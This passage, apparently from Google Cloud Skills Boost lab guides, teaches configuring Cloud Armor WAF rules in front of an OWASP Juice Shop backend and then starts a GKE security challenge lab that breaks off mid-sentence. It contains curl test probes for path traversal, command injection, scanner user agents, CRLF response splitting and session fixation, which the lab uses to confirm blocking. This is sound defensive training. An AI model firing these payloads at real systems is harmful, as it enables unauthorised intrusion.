tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute security-policies rules create 9004 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --security-policy Policy Name \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --description "block session fixation attacks" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; --expression "evaluatePreconfiguredExpr('sessionfixation-stable')" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --action deny-403</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Attach the security policy to the backend service:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute backend-services update juice-shop-backend \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --security-policy Policy Name \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --global</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Rules may take some time to propagate (but not more than 10 mins).</span></p><ol start='' ><li><p><span>Once sufficient time has passed, test the vulnerabilities previously demonstrated to confirm Cloud Armor WAF rule enforcement in the next step.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create the Cloud Armor security policy</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='observe-cloud-armor-protection-with-owasp-modsecurity-core-rule-set'><span>Observe Cloud Armor protection with OWASP ModSecurity Core Rule Set</span></h3><ol start='' ><li><p><span>In Cloud Shell, confirm the LFI vulnerability is mitigated:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -Ii http://$PUBLIC_SVC_IP/?a=../</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HTTP/1.1 403 Forbidden</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;...&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ol start='' ><li><p><span>In Cloud Shell, confirm the RCE attack is mitigated:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -Ii http://$PUBLIC_SVC_IP/ftp?doc=/bin/ls</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HTTP/1.1 403 Forbidden</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;..&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ol start='' ><li><p><span>In Cloud Shell, confirm well-known scanner detection.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -Ii http://$PUBLIC_SVC_IP -H "User-Agent: blackwidow"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HTTP/1.1 403 Forbidden</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;..&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ol start='' ><li><p><span>In Cloud Shell, confirm a protocol attack is mitigated.</span></p></li></ol><p><span>Per the OWASP ModSecurity Core Rule Set ver.3.0.2, the protocol attack is mitigated by:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -Ii "http://$PUBLIC_SVC_IP/index.html?foo=advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a&lt;html&gt;Sorry,%20System%20Down&lt;/html&gt;"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HTTP/1.1 403 Forbidden</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;..&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ol start='' ><li><p><span>In Cloud Shell, confirm session fixation attempts are blocked:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -Ii http://$PUBLIC_SVC_IP/?session_id=a</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HTTP/1.1 403 Forbidden</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;..&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><h2 id='task-5-review-cloud-armor-security-rules'><span>Task 5. Review Cloud Armor Security rules</span></h2><p><span>Now that you&#39;ve created the security policy, look at what rules have been configured.</span></p><p><img src="images\%2FGny3xzxEbID4ucNuzUG2jcI%2B6DdDxw29VEXQzMryTI%3D" referrerpolicy="no-referrer" alt="Rules tabbed page, which lists several rules and their descriptions"></p><p><span>Rules are evaluated by priority: lower numbers are evaluated first and once triggered, processing does not continue for rules with higher priority values.</span></p><ul><li><p><span>Priority </span><code>9000</code><span> - Block LFI (local file inclusion)</span></p></li><li><p><span>Priority </span><code>9001</code><span> - Block RCE (remote code execution/command injection)</span></p></li><li><p><span>Priority </span><code>9002</code><span> - Block Scanners Detected</span></p></li><li><p><span>Priority </span><code>9003</code><span> - Block Protocol Attacks like HTTP splitting and HTTP smuggling</span></p></li><li><p><span>Priority </span><code>9004</code><span> - Block Session Fixation Attacks</span></p></li><li><p><span>Priority </span><code>10000</code><span> - Allow your IP to access the Website</span></p></li><li><p><span>Priority </span><code>Default</code><span> - Deny.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Notice the &quot;allow your IP&quot; rule is configured with the highest priority number to allow access to the site, however blocks any attack.</span></p><h2 id='task-6-observe-cloud-armor-security-policy-logs'><span>Task 6. Observe Cloud Armor security policy logs</span></h2><p><span>From the Cloud Armor console page, view details of the security policy and click the Logs tab followed by the View policy logs link to be directed to the Cloud Logging page. It automatically filters based on the security policy of interest, for example, resource.type:(http_load_balancer) AND jsonPayload.enforcedSecurityPolicy.name:</span><code>Policy Name</code><span>. Observe the 403 error response codes and expand the log details to observe the enforced security policy&#39;s name, matched field value, and further down the preconfigured expression IDs (or the signature id).</span></p><p><span>It automatically filters based on the security policy of interest, for example, resource.type:(http_load_balancer) AND jsonPayload.enforcedSecurityPolicy.name:(</span><code>Policy Name</code><span>).</span></p><ul><li><p><span>Observe the 403 error response codes and expand the log details to observe the enforced security policy&#39;s name, matched field value, and further down the preconfigured expression IDs (or the signature id).</span></p></li></ul><p><span>The following screenshots show examples of the logs for the enforced security policies configured in this lab.</span></p><p><strong><span>LFI log</span></strong><span> </span><img src="images\l47JxLAvcfCmd%2Fx1wGGps9gDCKx5js0JFJccCMsUhS0%3D" referrerpolicy="no-referrer" alt="The LFI log"></p><p><strong><span>RCE log</span></strong><span> </span><img src="https://cdn.qwiklabs.com/rHCxfTyx7V5UrmgUPg9UAVy1ThHwNtb%2BVx%2BJ3HMCjMY%3D" referrerpolicy="no-referrer" alt="The RCE log"></p><p><strong><span>Scanner detection log</span></strong><span> </span><img src="images\NWy1aholOYNl20D22l0Cyq0Cvd0oUVPMPJOEpm8Rj1s%3D" referrerpolicy="no-referrer" alt="The Scanner detection  log"></p><p><strong><span>Protocol attack log</span></strong><span> </span><img src="images\y9%2FIIte2iC1FfzDQh64bwSNbp08osgbiTu8Pzue9fYA%3D" referrerpolicy="no-referrer" alt="The Protocol attack log"></p><p><strong><span>Session fixation log</span></strong><span> </span><img src="images\lg5h%2B4kDSasVLvSLGqnEmh9IxZRZvBP7RYYQwWs%2B7rU%3D" referrerpolicy="no-referrer" alt="The Session fixation log"></p><h2 id='congratulations-25'><span>Congratulations!</span></h2><p><span>You&#39;ve successfully mitigated some of the common vulnerabilities by using Google Cloud Armor WAF rules.</span></p><p><strong><span>Manual Last Updated November 06, 2024</span></strong></p><p><strong><span>Lab Last Tested November 06, 2024</span></strong></p><p>&nbsp;</p><p>&nbsp;</p><h1 id='implement-cloud-security-fundamentals-on-google-cloud'><span>Implement Cloud Security Fundamentals on Google Cloud</span></h1><p>&nbsp;</p><h2 id='implement-cloud-security-fundamentals-on-google-cloud-challenge-lab'><span>Implement Cloud Security Fundamentals on Google Cloud: Challenge Lab</span></h2><h3 id='overview-29'><span>Overview</span></h3><p><span>In a challenge lab you’re given a scenario and a set of tasks. Instead of following step-by-step instructions, you will use the skills learned from the labs in the course to figure out how to complete the tasks on your own! An automated scoring system (shown on this page) will provide feedback on whether you have completed your tasks correctly.</span></p><p><span>When you take a challenge lab, you will not be taught new Google Cloud concepts. You are expected to extend your learned skills, like changing default values and reading and researching error messages to fix your own mistakes.</span></p><p><span>To score 100% you must successfully complete all tasks within the time period!</span></p><p><span>This lab is recommended for students who have enrolled in the </span><a href='https://www.cloudskillsboost.google/course_templates/645'><span>Implement Cloud Security Fundamentals on Google Cloud</span></a><span> skill badge. Are you ready for the challenge?</span></p><h4 id='topics-tested'><span>Topics tested</span></h4><ul><li><p><span>Create a custom security role.</span></p></li><li><p><span>Create a service account.</span></p></li><li><p><span>Bind IAM security roles to a service account.</span></p></li><li><p><span>Create a private Kubernetes Engine cluster in a custom subnet.</span></p></li><li><p><span>Deploy an application to a private Kubernetes Engine cluster</span></p></li></ul><h3 id='setup-and-requirements-26'><span>Setup and requirements</span></h3><h4 id='before-you-click-the-start-lab-button-12'><span>Before you click the Start Lab button</span></h4><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h3 id='challenge-scenario-2'><span>Challenge scenario</span></h3><p><span>You have started a new role as a junior member of the security team for the Orca team in Jooli Inc. Your team is responsible for ensuring the security of the Cloud infrastructure and services that the company&#39;s applications depend on.</span></p><p><span>You are expected to have the skills and knowledge for these tasks, so don&#39;t expect step-by-step guides to be provided.</span></p><h4 id='your-challenge-2'><span>Your challenge</span></h4><p><span>You have been asked to deploy, configure, and test a new Kubernetes Engine cluster that will be used for application development and pipeline testing by the Orca development team.</span></p><p><span>As per the organization&#39;s security standards you must ensure that the new Kubernetes Engine cluster is built according to the organization&#39;s most recent security standards and thereby must comply with the following:</span></p><ul><li><p><span>The cluster must be deployed using a dedicated service account configured with the least privileges required.</span></p></li><li><p><span>The cluster must be deployed as a Kubernetes Engine private cluster, with the public endpoint disabled, and the master authorized network set to include only the ip-address of the Orca group&#39;s management jumphost.</span></p></li><li><p><span>The Kubernetes Engine private cluster must be deployed to the </span><code>orca-build-subnet</code><span> in the Orca Build VPC.</span></p></li></ul><p><span>From a previous project you know that the minimum permissions required by the service account that is specified for a Kubernetes Engine cluster is covered by these three built in roles:</span></p><ul><li><p><code>roles/monitoring.viewer</code></p></li><li><p><code>roles/monitoring.metricWriter</code></p></li><li><p><code>roles/logging.logWriter</code></p></li></ul><p><span>These roles are specified in the Google Kubernetes Engine (GKE)&#39;s Harden your cluster&#39;s security guide in the </span><a href='https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#use_least_privilege_sa'><span>Use least privilege Google service accounts</span></a><span> section.</span></p><p><span>You must bind the above roles to the service account used by the cluster as well as a custom role that you must create in order to provide access to any other services specified by the development team. Initially you have been told that the development team requires that the service account used by the cluster should have the permissions necessary to add and update objects in Google Cloud Storage buckets. To do this you will have to create a new custom IAM role that will provide the following permissions:</span></p><ul><li><p><code>storage.buckets.get</code></p></li><li><p><code>storage.objects.get</code></p></li><li><p><code>storage.objects.list</code></p></li><li><p><code>storage.objects.update</code></p></li><li><p><code>storage.objects.create</code></p></li></ul><p><span>Once you have created the new private cluster you must test that it is correctly configured by connecting to it from the jumphost, </span><code>orca-jumphost</code><span>, in the management subnet </span><code>orca-mgmt-subnet</code><span>. As this compute instance is not in the same subnet as the private cluster you must make sure that the master authorized networks 